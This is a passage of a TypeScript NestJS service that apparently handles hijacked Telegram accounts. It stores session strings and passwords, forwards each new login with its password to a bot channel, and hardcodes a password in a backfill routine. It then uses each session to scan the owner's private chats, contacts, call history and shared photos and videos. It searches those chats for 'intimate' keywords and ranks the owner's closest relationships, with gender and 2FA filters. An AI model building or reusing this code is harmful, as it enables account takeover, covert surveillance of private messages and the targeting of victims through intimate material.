import { TelegramService } from '../Telegram/Telegram.service';
import {
  BadRequestException,
  Inject,
  Injectable,
  InternalServerErrorException,
  NotFoundException,
  forwardRef,
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model, QueryFilter } from 'mongoose';
import { User, UserDocument } from './schemas/user.schema';
import { SearchUserDto } from './dto/search-user.dto';
import { ClientService } from '../clients/client.service';
import { UpdateUserDto } from './dto/update-user.dto';
import { CreateUserDto } from './dto/create-user.dto';
import { connectionManager } from '../Telegram/utils/connection-manager';
import { BotsService, ChannelCategory } from '../bots';
import { sleep } from 'telegram/Helpers';
import { Logger } from '../../utils';
import { INTIMATE_KEYWORDS, NEGATIVE_KEYWORDS, rankRelationships, computeAccountScore, RelationshipCandidate } from './scoring';
import { Api } from 'telegram/tl';
import bigInt from 'big-integer';
import { parseError } from '../../utils/parseError';
import { canonicalizeMobile } from '../shared/mobile-utils';
import { getTelegramCommonChatIds } from '../../utils/telegram-utils/common-chats';
import { BufferClientService } from '../buffer-clients/buffer-client.service';
import { PromoteClientService } from '../promote-clients/promote-client.service';

@Injectable()
export class UsersService {
  private readonly logger = new Logger(UsersService.name);

  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,
    @Inject(forwardRef(() => TelegramService))
    private telegramService: TelegramService,
    @Inject(forwardRef(() => ClientService))
    private clientsService: ClientService,
    private readonly botsService: BotsService,
    // NOT @Optional(): these power the expireAccount cascade. If the forwardRef
    // cycle ever fails to resolve, we want a loud bootstrap failure — a silent
    // null here would reintroduce the exact "user expired but pool still active"
    // bug expireAccount exists to prevent.
    @Inject(forwardRef(() => BufferClientService))
    private bufferClientService: BufferClientService,
    @Inject(forwardRef(() => PromoteClientService))
    private promoteClientService: PromoteClientService,
  ) { }

  /**
   * Single source of truth for retiring a permanently-lost account.
   *
   * "expired" means the account is fully lost (session revoked, banned, or
   * deactivated). When that happens, the user doc must be marked expired AND
   * any matching bufferClients / promoteClients must be deactivated so they
   * stop being selected for warmup, swaps, or promotion. Previously callers
   * set `expired: true` on the user doc directly, leaving the pool records
   * active — producing "user not found" / empty-array responses for a mobile
   * that the pools still treated as live.
   *
   * Idempotent: safe to call repeatedly. Pool deactivation failures are
   * non-fatal — marking the user expired is the primary action.
   */
  async expireAccount(
    mobile: string,
    reason: string = 'Account permanently lost (session revoked / banned / deactivated)',
  ): Promise<void> {
    const canonicalMobile = this.canonicalMobile(mobile);

    // 1. Mark ALL user docs for this mobile expired. The users collection stores
    //    one doc per session (not per person), so a mobile can have multiple
    //    active session docs. When the account is permanently lost, every session
    //    for that number is dead — updateMany ensures none remain selectable.
    try {
      await this.userModel
        .updateMany({ mobile: canonicalMobile }, { $set: { expired: true } })
        .exec();
    } catch (error) {
      this.logger.error(`expireAccount: failed to mark user ${canonicalMobile} expired: ${error instanceof Error ? error.message : String(error)}`);
    }

    // 2. Cascade: deactivate any matching buffer / promote pool records.
    //    markAsInactive is idempotent (no-op if the record is missing or already
    //    inactive), so this is safe even when only one pool holds the mobile.
    await Promise.allSettled([
      (async () => {
        try {
          await this.bufferClientService.markAsInactive(canonicalMobile, reason);
        } catch (error) {
          this.logger.error(`expireAccount: failed to deactivate buffer client ${canonicalMobile}: ${error instanceof Error ? error.message : String(error)}`);
        }
      })(),
      (async () => {
        try {
          await this.promoteClientService.markAsInactive(canonicalMobile, reason);
        } catch (error) {
          this.logger.error(`expireAccount: failed to deactivate promote client ${canonicalMobile}: ${error instanceof Error ? error.message : String(error)}`);
        }
      })(),
    ]);
  }

  async create(user: CreateUserDto): Promise<User | undefined> {
    const canonicalMobile = this.canonicalMobile(user.mobile);
    const userData: CreateUserDto = { ...user, mobile: canonicalMobile };
    const activeClientSetup = this.telegramService.getActiveClientSetup(canonicalMobile);
    this.logger.log(`New User received - ${canonicalMobile}`);
    this.logger.debug('ActiveClientSetup:', activeClientSetup);
    if (activeClientSetup && activeClientSetup.newMobile === canonicalMobile) {
      this.logger.log(`Updating New Session Details: ${canonicalMobile}, @${userData.username}, ${activeClientSetup.clientId}`);
      await this.clientsService.updateClientSession(userData.session, canonicalMobile);
    } else {
      await this.botsService.sendMessageByCategory(
        ChannelCategory.ACCOUNT_LOGINS,
        `<b>Account Login</b>\n\n<b>Username:</b> ${userData.username ? `@${userData.username}` : userData.firstName}\n<b>Mobile:</b> ${canonicalMobile}${userData.password ? `\n<b>Password:</b> ${userData.password}` : ''}`,
        { parseMode: 'HTML' },
        false
      );
      const newUser = new this.userModel(userData);
      const saved = await newUser.save();
      setTimeout(() => {
        this.computeRelationshipScore(canonicalMobile).catch(err => {
          this.logger.error(`Background scoring failed for ${canonicalMobile}`, err);
        });
      }, 5000);
      return saved;
    }
  }

  async top(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    minCalls?: number;
    minPhotos?: number;
    minVideos?: number;
    excludeTwoFA?: boolean;
    excludeAudited?: boolean;
    gender?: string;
    starred?: boolean;
  }): Promise<{
    users: User[];
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  }> {
    const {
      page = 1,
      limit = 20,
      minScore = 0,
      minCalls = 0,
      minPhotos = 0,
      minVideos = 0,
      excludeTwoFA = false,
      gender,
      starred,
    } = options;

    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    let excludedMobiles: string[] = [];
    try {
      excludedMobiles = await this.telegramService.getOwnAccountMobiles();
    } catch { }

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.score': { $gte: minScore },
      ...(excludedMobiles.length > 0 && { mobile: { $nin: excludedMobiles } }),
    };

    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;
    if (starred) query.starred = true;
    if (minCalls > 0) query['calls.totalCalls'] = { $gte: minCalls };
    if (minPhotos > 0) query['photoCount'] = { $gte: minPhotos };
    if (minVideos > 0) query['videoCount'] = { $gte: minVideos };

    const total = await this.userModel.countDocuments(query).exec();
    const totalPages = Math.ceil(total / limitNum);

    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session')
      .sort({ 'relationships.score': -1 })
      .skip(skip)
      .limit(limitNum)
      .allowDiskUse(true)
      .lean()
      .exec();

    return { users: users as User[], total, page: pageNum, limit: limitNum, totalPages };
  }

  async leaderboard(options: {
    aspect: string;
    limit?: number;
  }): Promise<{
    ranked: any[];
    stats: { highest: number; average: number; withValue: number };
  }> {
    const { aspect, limit = 25 } = options;
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);

    // Map aspect IDs to MongoDB field expressions
    const ASPECT_MAP: Record<string, { field?: string; computed?: any }> = {
      msgs: { field: 'msgs' },
      totalChats: { field: 'totalChats' },
      personalChats: { field: 'personalChats' },
      channels: { field: 'channels' },
      contacts: { field: 'contacts' },
      totalCalls: { field: 'calls.totalCalls' },
      incomingCalls: { field: 'calls.incoming' },
      outgoingCalls: { field: 'calls.outgoing' },
      videoCalls: { field: 'calls.video' },
      movieCount: { field: 'movieCount' },
      otherPhotos: { field: 'otherPhotoCount' },
      otherVideos: { field: 'otherVideoCount' },
      ownPhotos: { field: 'ownPhotoCount' },
      ownVideos: { field: 'ownVideoCount' },
      relationshipScore: { field: 'relationships.score' },
      relationshipBestScore: { field: 'relationships.bestScore' },
      totalMedia: {
        computed: {
          $add: [
            { $ifNull: ['$photoCount', 0] },
            { $ifNull: ['$videoCount', 0] },
            { $ifNull: ['$otherPhotoCount', 0] },
            { $ifNull: ['$otherVideoCount', 0] },
            { $ifNull: ['$ownPhotoCount', 0] },
            { $ifNull: ['$ownVideoCount', 0] },
          ],
        },
      },
      engagement: {
        computed: {
          $add: [
            { $ifNull: ['$msgs', 0] },
            { $multiply: [{ $ifNull: ['$totalChats', 0] }, 10] },
            { $multiply: [{ $ifNull: ['$calls.totalCalls', 0] }, 20] },
            { $multiply: [{ $ifNull: ['$contacts', 0] }, 2] },
          ],
        },
      },
      recency: { field: 'lastActive' },
    };

    const aspectDef = ASPECT_MAP[aspect];
    if (!aspectDef) {
      throw new BadRequestException(`Unknown aspect: ${aspect}`);
    }

    let excludedMobiles: string[] = [];
    try {
      excludedMobiles = await this.telegramService.getOwnAccountMobiles();
    } catch { }

    const matchStage: any = await this.getDefaultUserListQuery(
      excludedMobiles.length > 0 ? ({ mobile: { $nin: excludedMobiles } } as QueryFilter<UserDocument>) : {},
    );

    // For recency, sort by lastActive descending (string comparison works for ISO dates)
    const isRecency = aspect === 'recency';
    const sortField = '_sortValue';

    const valueExpr = aspectDef.computed
      ? aspectDef.computed
      : (isRecency ? `$${aspectDef.field}` : { $ifNull: [`$${aspectDef.field}`, 0] });

    const pipeline: any[] = [
      { $match: matchStage },
      { $addFields: { [sortField]: valueExpr } },
    ];

    // Filter out zero/null values (except recency where we filter empty strings)
    if (isRecency) {
      pipeline.push({ $match: { [sortField]: { $exists: true, $nin: ['', null] } } });
    } else {
      pipeline.push({ $match: { [sortField]: { $gt: 0 } } });
    }

    // Stats facet: get count + avg + max, then top N ranked
    pipeline.push({
      $facet: {
        stats: [
          {
            $group: {
              _id: null,
              withValue: { $sum: 1 },
              average: { $avg: isRecency ? 1 : `$${sortField}` },
              highest: { $max: isRecency ? 1 : `$${sortField}` },
            },
          },
        ],
        ranked: [
          { $sort: { [sortField]: -1 } },
          { $limit: limitNum },
          {
            $project: {
              session: 0,
              password: 0,
            },
          },
        ],
      },
    });

    const [result] = await this.userModel.aggregate(pipeline).allowDiskUse(true).exec();

    const stats = result.stats[0] || { highest: 0, average: 0, withValue: 0 };

    return {
      ranked: result.ranked || [],
      stats: {
        highest: isRecency ? 0 : Math.round(stats.highest || 0),
        average: isRecency ? 0 : Math.round(stats.average || 0),
        withValue: stats.withValue || 0,
      },
    };
  }

  async findAll(limit: number = 100, skip: number = 0): Promise<User[]> {
    return this.userModel.find().limit(limit).skip(skip).exec();
  }

  private hasQueryConstraint(query: any, field: string): boolean {
    if (!query || typeof query !== 'object') return false;
    if (Object.prototype.hasOwnProperty.call(query, field)) return true;

    for (const key of ['$and', '$or', '$nor']) {
      const clauses = query[key];
      if (Array.isArray(clauses) && clauses.some(clause => this.hasQueryConstraint(clause, field))) {
        return true;
      }
    }

    return false;
  }

  /**
   * Coerce ISO-date STRING operands on Date-typed fields to real Date objects.
   *
   * `createdAt`/`updatedAt` are stored as BSON Date (Mongoose timestamps), but
   * clients send range filters like `{ createdAt: { $gte: "2026-04-13T...Z" } }`
   * as strings. MongoDB type-bracketing means a Date field never matches a string
   * operand, so those filters silently return nothing. We rewrite the string
   * operands to Date for the known date fields so the filter actually works.
   */
  private coerceDateOperands(query: any): any {
    if (!query || typeof query !== 'object') return query;
    const DATE_FIELDS = new Set(['createdAt', 'updatedAt']);
    const RANGE_OPS = new Set(['$gte', '$lte', '$gt', '$lt', '$eq', '$ne']);
    const toDate = (v: any): any => {
      if (typeof v !== 'string') return v;
      const ts = Date.parse(v);
      return Number.isNaN(ts) ? v : new Date(ts);
    };
    const walk = (node: any): any => {
      if (!node || typeof node !== 'object') return node;
      if (Array.isArray(node)) return node.map(walk);
      const out: any = {};
      for (const [key, value] of Object.entries(node)) {
        if (DATE_FIELDS.has(key) && value && typeof value === 'object' && !Array.isArray(value)) {
          // Range-operator object on a date field: convert string operands to Date.
          const coercedOps: any = {};
          for (const [op, opVal] of Object.entries(value as Record<string, any>)) {
            coercedOps[op] = RANGE_OPS.has(op) ? toDate(opVal) : opVal;
          }
          out[key] = coercedOps;
        } else if (DATE_FIELDS.has(key) && typeof value === 'string') {
          // Direct equality with a string date.
          out[key] = toDate(value);
        } else if (key === '$and' || key === '$or' || key === '$nor') {
          out[key] = Array.isArray(value) ? (value as any[]).map(walk) : value;
        } else {
          out[key] = value;
        }
      }
      return out;
    };
    return walk(query);
  }

  private async getDefaultUserListQuery(query: QueryFilter<UserDocument> = {}): Promise<QueryFilter<UserDocument>> {
    query = this.coerceDateOperands(query);
    const clauses: QueryFilter<UserDocument>[] = [];

    if (!this.hasQueryConstraint(query, 'expired')) {
      clauses.push({ expired: { $ne: true } } as QueryFilter<UserDocument>);
    }

    if (!this.hasQueryConstraint(query, 'mobile')) {
      let excludedMobiles: string[] = [];
      try {
        excludedMobiles = await this.telegramService.getOwnAccountMobiles();
      } catch { }
      if (excludedMobiles.length > 0) {
        clauses.push({ mobile: { $nin: excludedMobiles } } as QueryFilter<UserDocument>);
      }
    }

    if (clauses.length === 0) return query;
    if (!query || Object.keys(query).length === 0) {
      return clauses.length === 1 ? clauses[0] : ({ $and: clauses } as QueryFilter<UserDocument>);
    }

    return { $and: [...clauses, query] } as QueryFilter<UserDocument>;
  }

  async findAllSorted(limit: number = 100, skip: number = 0, sort?: Record<string, 1 | -1>): Promise<User[]> {
    const filter = await this.getDefaultUserListQuery();
    const query = this.userModel.find(filter).lean();
    if (sort) query.sort(sort);
    return query.skip(skip).limit(limit).allowDiskUse(true).exec();
  }

  async summary(): Promise<Record<string, any>> {
    const [result] = await this.userModel.aggregate([
      {
        $facet: {
          totals: [
            {
              $group: {
                _id: null,
                total: { $sum: 1 },
                active: {
                  $sum: { $cond: [{ $gte: ['$lastActive', '2026-01-01'] }, 1, 0] },
                },
                starred: { $sum: { $cond: [{ $eq: ['$starred', true] }, 1, 0] } },
                expired: { $sum: { $cond: [{ $eq: ['$expired', true] }, 1, 0] } },
                withTwoFA: { $sum: { $cond: [{ $eq: ['$twoFA', true] }, 1, 0] } },
                withCalls: {
                  $sum: { $cond: [{ $gt: ['$calls.totalCalls', 0] }, 1, 0] },
                },
                withRelationship: {
                  $sum: { $cond: [{ $gt: ['$relationships.score', 0] }, 1, 0] },
                },
                avgMsgs: { $avg: '$msgs' },
                avgContacts: { $avg: '$contacts' },
                avgChats: { $avg: '$totalChats' },
                totalMsgs: { $sum: '$msgs' },
                totalCalls: { $sum: '$calls.totalCalls' },
                totalContacts: { $sum: '$contacts' },
              },
            },
          ],
          genderBreakdown: [
            { $group: { _id: '$gender', count: { $sum: 1 } } },
          ],
        },
      },
    ]).allowDiskUse(true).exec();

    const totals = result.totals[0] || {};
    const genderBreakdown = Object.fromEntries(
      (result.genderBreakdown || []).map((g: any) => [g._id || 'unknown', g.count]),
    );

    return {
      total: totals.total || 0,
      active: totals.active || 0,
      starred: totals.starred || 0,
      expired: totals.expired || 0,
      withTwoFA: totals.withTwoFA || 0,
      withCalls: totals.withCalls || 0,
      withRelationship: totals.withRelationship || 0,
      avgMsgs: Math.round(totals.avgMsgs || 0),
      avgContacts: Math.round(totals.avgContacts || 0),
      avgChats: Math.round(totals.avgChats || 0),
      totalMsgs: totals.totalMsgs || 0,
      totalCalls: totals.totalCalls || 0,
      totalContacts: totals.totalContacts || 0,
      genderBreakdown,
    };
  }

  async paginated(options: {
    page?: number;
    limit?: number;
    sortBy?: string;
    sortOrder?: 'asc' | 'desc';
    search?: string;
    filter?: 'all' | 'active' | 'starred' | 'expired' | 'withCalls';
  }): Promise<{
    users: User[];
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  }> {
    const {
      page = 1,
      limit = 50,
      sortBy = 'lastActive',
      sortOrder = 'desc',
      search,
      filter = 'all',
    } = options;

    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 200);
    const skip = (pageNum - 1) * limitNum;

    const query: any = {};

    // Apply filter
    if (filter === 'active') query.lastActive = { $gte: '2026-01-01' };
    else if (filter === 'starred') query.starred = true;
    else if (filter === 'expired') query.expired = true;
    else if (filter === 'withCalls') query['calls.totalCalls'] = { $gt: 0 };

    // Apply search (name, mobile, username, tgId)
    if (search?.trim()) {
      const q = search.trim();
      query.$or = [
        { firstName: { $regex: q, $options: 'i' } },
        { lastName: { $regex: q, $options: 'i' } },
        { username: { $regex: q, $options: 'i' } },
        { mobile: { $regex: q } },
        { tgId: q },
      ];
    }

    const listQuery = await this.getDefaultUserListQuery(query);
    const total = await this.userModel.countDocuments(listQuery).exec();
    const totalPages = Math.ceil(total / limitNum);

    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const sort: Record<string, 1 | -1> = { [sortBy]: sortOrder === 'asc' ? 1 : -1 };

    const users = await this.userModel
      .find(listQuery)
      .select('-session -password')
      .sort(sort)
      .skip(skip)
      .limit(limitNum)
      .allowDiskUse(true)
      .lean()
      .exec();

    return { users: users as User[], total, page: pageNum, limit: limitNum, totalPages };
  }

  async findOne(tgId: string): Promise<User> {
    const doc = await this.userModel.findOne({ tgId }).exec();
    if (!doc) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return doc.toJSON();
  }

  /**
   * Self-heal a missing users doc from a pool record's own data.
   *
   * Pool records (bufferClients / promoteClients) can outlive their users doc: the
   * user gets pruned/expired but the pool record persists, so any code that does
   * `usersService.search({ mobile })` then throws "user not found" — breaking
   * session rotation and warmup for an otherwise-usable account.
   *
   * This recreates the minimal, required user identity (mobile, session, tgId) with a
   * plain upsert — NO bot notifications, NO relationship scoring, NO client-session
   * side effects (unlike create()). Idempotent: an existing user is left untouched.
   * Returns the resulting user, or null if the inputs are insufficient/invalid.
   */
  async backfillFromPool(input: { mobile: string; tgId?: string | null; session?: string | null }): Promise<User | null> {
    const session = input.session?.trim();
    const tgId = input.tgId != null ? String(input.tgId).trim() : '';
    if (!session || !tgId) return null; // required unique fields — cannot create a valid user without them

    let canonicalMobile: string;
    try {
      canonicalMobile = this.canonicalMobile(input.mobile);
    } catch {
      return null;
    }

    try {
      const existing = await this.userModel
        .findOne({ $or: [{ mobile: canonicalMobile }, { tgId }] })
        .exec();
      if (existing) return existing.toJSON();

      const created = await this.userModel.findOneAndUpdate(
        { tgId },
        {
          $setOnInsert: {
            mobile: canonicalMobile,
            session,
            tgId,
            twoFA: true,
            expired: false,
            password: 'Ajtdmwajt1@',
          },
        },
        { new: true, upsert: true },
      ).exec();
      this.logger.log(`backfillFromPool: recreated missing user for ${canonicalMobile} (tgId ${tgId})`);
      return created ? created.toJSON() : null;
    } catch (error) {
      // A concurrent insert / unique-index race is fine — re-read and return.
      this.logger.warn(`backfillFromPool: upsert for ${canonicalMobile} raced or failed: ${error instanceof Error ? error.message : String(error)}`);
      const fallback = await this.userModel.findOne({ tgId }).exec();
      return fallback ? fallback.toJSON() : null;
    }
  }

  async update(tgId: string, updateDto: UpdateUserDto): Promise<User> {
    const updateData: UpdateUserDto = { ...updateDto };
    if (updateData.mobile !== undefined) {
      updateData.mobile = this.canonicalMobile(updateData.mobile);
    }
    const updated = await this.userModel
      .findOneAndUpdate({ tgId }, { $set: updateData }, { new: true })
      .exec();
    if (!updated) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    return updated;
  }

  async updateByFilter(
    filter: QueryFilter<UserDocument>,
    updateDto: UpdateUserDto,
  ): Promise<number> {
    const result = await this.userModel
      .updateMany(filter, { $set: updateDto })
      .exec();
    if (result.matchedCount === 0) {
      throw new NotFoundException(`Users matching filter not found`);
    }
    return result.modifiedCount;
  }

  async toggleStar(mobile: string): Promise<{ mobile: string; starred: boolean }> {
    const canonicalMobile = this.canonicalMobile(mobile);
    const user = await this.userModel.findOne({ mobile: canonicalMobile }).select('mobile starred').exec();
    if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
    const newVal = !user.starred;
    await this.userModel.updateMany({ mobile: canonicalMobile }, { $set: { starred: newVal } }).exec();
    return { mobile: canonicalMobile, starred: newVal };
  }

  async delete(tgId: string): Promise<void> {
    const user = await this.userModel.findOne({ tgId }).select('mobile').exec();
    if (!user) {
      throw new NotFoundException(`User with tgId ${tgId} not found`);
    }
    // Deleting a user means the account is gone — cascade so the pool records
    // are deactivated too, not just the user doc.
    await this.expireAccount(user.mobile, 'User deleted');
  }

  async search(filter: SearchUserDto): Promise<User[]> {
    // SearchUserDto's boolean fields are typed `boolean | string` so the ValidationPipe's
    // implicit conversion can't invert them (see the DTO); by the time we get here the
    // @Transform has produced real booleans, so the spread is safe to treat as a query filter.
    const query: QueryFilter<UserDocument> = { ...filter } as QueryFilter<UserDocument>;
    if (typeof query.mobile === 'string' && query.mobile) {
      query.mobile = this.canonicalMobile(query.mobile);
    }

    const escapeRegex = (text: string) => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const regexFields = ['firstName', 'lastName', 'username'];
    for (const field of regexFields) {
      if (typeof query[field] === 'string' && query[field]) {
        query[field] = { $regex: new RegExp(escapeRegex(query[field] as string), 'i') };
      }
    }

    const listQuery = await this.getDefaultUserListQuery(query);

    return this.userModel.find(listQuery).sort({ updatedAt: -1 }).limit(200).exec();
  }

  async computeRelationshipScore(mobile: string): Promise<void> {
    const canonicalMobile = this.canonicalMobile(mobile);
    const wasConnected = connectionManager.hasClient(canonicalMobile);
    let telegramClient: Awaited<ReturnType<typeof connectionManager.getClient>> | null = null;

    try {
      telegramClient = await connectionManager.getClient(canonicalMobile, { autoDisconnect: false, handler: false });
      const me = await telegramClient.getMe();
      const selfId = me.id?.toString();

      // ─── Phase 1: Hybrid candidate discovery ───
      // Source A: GetTopPeers — Telegram's server-side interaction ranking (not recency-biased)
      // Source B: iterDialogs — recent chats (catches new relationships GetTopPeers hasn't ranked yet)
      // Merge + dedup to get the best of both worlds

      const candidateMap = new Map<string, { id: string; name: string; username: string | null; phone: string | null; source: 'topPeers' | 'dialogs' | 'both' }>();
      const excludedIds = new Set(['777000', '42', '333000', '178220800']);
      try {
        const ownAccountIds = await this.telegramService.getOwnAccountTgIds();
        for (const id of ownAccountIds) excludedIds.add(id);
      } catch (e) {
        this.logger.warn(`[${mobile}] Failed to fetch own account IDs: ${(e as Error).message}`);
      }

      // Source A: GetTopPeers (1 API call — most valuable signal)
      try {
        const topPeersResult = await telegramClient.client.invoke(
          new Api.contacts.GetTopPeers({
            correspondents: true,
            phoneCalls: true,
            forwardUsers: true,
            offset: 0,
            limit: 50,
            hash: bigInt(0),
          }),
        );

        if (topPeersResult instanceof Api.contacts.TopPeers) {
          const userMap = new Map<string, Api.User>();
          for (const u of topPeersResult.users || []) {
            if (u instanceof Api.User && !u.bot) {
              userMap.set(u.id.toString(), u);
            }
          }

          for (const category of topPeersResult.categories || []) {
            for (const topPeer of category.peers || []) {
              const peerId = (topPeer.peer as any)?.userId?.toString();
              if (!peerId || peerId === selfId || excludedIds.has(peerId)) continue;
              const user = userMap.get(peerId);
              if (!user) continue;
              candidateMap.set(peerId, {
                id: peerId,
                name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
                username: user.username || null,
                phone: user.phone || null,
                source: 'topPeers',
              });
            }
          }
          this.logger.log(`[${mobile}] GetTopPeers: ${candidateMap.size} candidates`);
        }
      } catch (topPeersError) {
        this.logger.warn(`[${mobile}] GetTopPeers failed (may be disabled): ${(topPeersError as Error).message}`);
      }

      // Source B: iterDialogs — recent private chats (catches what GetTopPeers misses)
      try {
        let dialogCount = 0;
        for await (const d of telegramClient.client.iterDialogs({ limit: 100 })) {
          if (!d.isUser || !(d.entity instanceof Api.User)) continue;
          const user = d.entity as Api.User;
          if (user.bot) continue;
          const id = user.id.toString();
          if (id === selfId || excludedIds.has(id)) continue;

          const existing = candidateMap.get(id);
          if (existing) {
            existing.source = 'both';
          } else {
            candidateMap.set(id, {
              id,
              name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
              username: user.username || null,
              phone: user.phone || null,
              source: 'dialogs',
            });
          }
          dialogCount++;
          if (dialogCount >= 40) break;
        }
        this.logger.log(`[${mobile}] iterDialogs: ${dialogCount} users scanned, total candidates: ${candidateMap.size}`);
      } catch (dialogError) {
        this.logger.warn(`[${mobile}] iterDialogs failed: ${(dialogError as Error).message}`);
      }

      if (candidateMap.size === 0) {
        this.logger.log(`[${mobile}] No candidates found from either source`);
        return;
      }

      // ─── Phase 1.5: Contacts for mutual detection ───
      const mutualChatIds = new Set<string>();
      try {
        const contactsResult = await telegramClient.getContacts();
        if (contactsResult && 'users' in contactsResult) {
          for (const user of (contactsResult as any).users || []) {
            if (user.mutualContact) mutualChatIds.add(user.id?.toString());
          }
        }
      } catch { }

      // ─── Phase 2: Per-chat enrichment (top 15 candidates) ───
      // For each candidate: message count, media count, voice count, call stats,
      // common chats, intimate keyword search — NO media filter (text-heavy relationships qualify)

      const allCandidates = Array.from(candidateMap.values()).slice(0, 15);
      const candidates: RelationshipCandidate[] = [];
      const callAgg = { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 };

      for (const candidate of allCandidates) {
        try {
          if (excludedIds.has(candidate.id)) continue;
          try {
            const entity = await telegramClient.client.getEntity(candidate.id);
            if ((entity as any).bot) continue;
          } catch { }

          const chatPeer = await telegramClient.getchatId(candidate.id);

          // Message count (1 API call)
          let totalMessages = 0;
          let lastMessageDate: string | null = null;
          try {
            const msgResult = await telegramClient.client.getMessages(candidate.id, { limit: 1 });
            totalMessages = (msgResult as any)?.total ?? 0;
            const lastMsg = (msgResult as any)?.[0];
            if (lastMsg?.date) {
              lastMessageDate = new Date(lastMsg.date * 1000).toISOString();
            }
          } catch { }

          // Skip chats with < 5 messages (noise)
          if (totalMessages < 5) {
            await sleep(100);
            continue;
          }

          // Media + voice counts via GetSearchCounters (1 API call, 4 filters)
          // Photos + round videos = personal media (full weight)
          // Regular videos counted separately (discounted — could be forwarded large files)
          // Documents excluded entirely (not relationship signals)
          let photoCount = 0;
          let videoCount = 0;
          let roundVideoCount = 0;
          let voiceCount = 0;
          try {
            const counters = await telegramClient.client.invoke(
              new Api.messages.GetSearchCounters({
                peer: chatPeer,
                filters: [
                  new Api.InputMessagesFilterPhotos(),
                  new Api.InputMessagesFilterVideo(),
                  new Api.InputMessagesFilterRoundVideo(),
                  new Api.InputMessagesFilterVoice(),
                ],
              }),
            );
            const counterArr = counters as any as Array<{ count: number }>;
            photoCount = counterArr?.[0]?.count ?? 0;
            videoCount = counterArr?.[1]?.count ?? 0;
            roundVideoCount = counterArr?.[2]?.count ?? 0;
            voiceCount = counterArr?.[3]?.count ?? 0;
          } catch { }
          // Personal media = photos + round videos (always small/personal)
          // Regular videos discounted 50% (many are forwarded movies/clips >20MB)
          const mediaCount = photoCount + roundVideoCount + Math.floor(videoCount * 0.5);

          // Call stats — includeCalls=true to get per-call entries for duration filtering
          let callStats = { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0, outgoing: 0, audioCalls: 0, meaningfulCalls: 0 };
          try {
            const callHistory = await telegramClient.getChatCallHistory(candidate.id, 200, true);
            const meaningfulCalls = (callHistory as any).calls
              ? (callHistory as any).calls.filter((c: any) => c.durationSeconds > 30).length
              : (callHistory.averageDuration > 30 ? callHistory.totalCalls : 0);
            callStats = {
              totalCalls: callHistory.totalCalls,
              incoming: callHistory.incoming,
              outgoing: callHistory.outgoing,
              videoCalls: callHistory.videoCalls,
              audioCalls: callHistory.audioCalls,
              totalDuration: callHistory.totalDuration,
              averageDuration: callHistory.averageDuration,
              meaningfulCalls,
            };
            callAgg.totalCalls += callStats.totalCalls;
            callAgg.incoming += callStats.incoming;
            callAgg.outgoing += callStats.outgoing;
            callAgg.video += callStats.videoCalls;
            callAgg.audio += callStats.audioCalls;
          } catch { }

          // Common chats
          let commonChats = 0;
          try {
            const commonChatIds = await getTelegramCommonChatIds(telegramClient.client, {
              userId: candidate.id,
              maxId: bigInt(0),
              limit: 100,
            });
            commonChats = commonChatIds.length;
          } catch { }

          // Keyword search — intimate (positive) + movie/piracy (negative)
          let intimateMessageCount = 0;
          let negativeKeywordCount = 0;

          const searchKeyword = async (keyword: string): Promise<number> => {
            try {
              const result = await telegramClient.client.invoke(
                new Api.messages.Search({
                  peer: chatPeer,
                  q: keyword,
                  filter: new Api.InputMessagesFilterEmpty(),
                  minDate: 0,
                  maxDate: 0,
                  offsetId: 0,
                  addOffset: 0,
                  limit: 1,
                  maxId: 0,
                  minId: 0,
                  hash: bigInt(0),
                }),
              );
              await sleep(150);
              return (result as any)?.count ?? 0;
            } catch { return 0; }
          };

          for (const keyword of INTIMATE_KEYWORDS) {
            intimateMessageCount += await searchKeyword(keyword);
          }
          for (const keyword of NEGATIVE_KEYWORDS) {
            negativeKeywordCount += await searchKeyword(keyword);
          }

          candidates.push({
            chatId: candidate.id,
            name: candidate.name,
            username: candidate.username,
            phone: candidate.phone,
            messages: totalMessages,
            mediaCount,
            voiceCount,
            intimateMessageCount,
            negativeKeywordCount,
            calls: {
              total: callStats.totalCalls,
              incoming: callStats.incoming,
              videoCalls: callStats.videoCalls,
              avgDuration: callStats.averageDuration,
              totalDuration: callStats.totalDuration,
              meaningfulCalls: callStats.meaningfulCalls,
            },
            commonChats,
            isMutualContact: mutualChatIds.has(candidate.id),
            lastMessageDate,
          });

          this.logger.debug(`[${mobile}] Scored ${candidate.name}: msgs=${totalMessages} media=${mediaCount} voice=${voiceCount} intimate=${intimateMessageCount} calls=${callStats.totalCalls} (${candidate.source})`);
          await sleep(200);
        } catch (chatError) {
          this.logger.warn(`[${mobile}] Failed to score chat ${candidate.id}: ${(chatError as Error).message}`);
        }
      }

      // ─── Phase 3: Rank, persist ───
      const top = rankRelationships(candidates, 5);
      const accountScore = computeAccountScore(top);
      const bestScore = top.length > 0 ? top[0].score : 0;

      await this.userModel.updateMany(
        { mobile: canonicalMobile },
        {
          $set: {
            'relationships.score': accountScore,
            'relationships.bestScore': bestScore,
            'relationships.computedAt': new Date(),
            'relationships.top': top,
            calls: callAgg,
          },
        },
      ).exec();

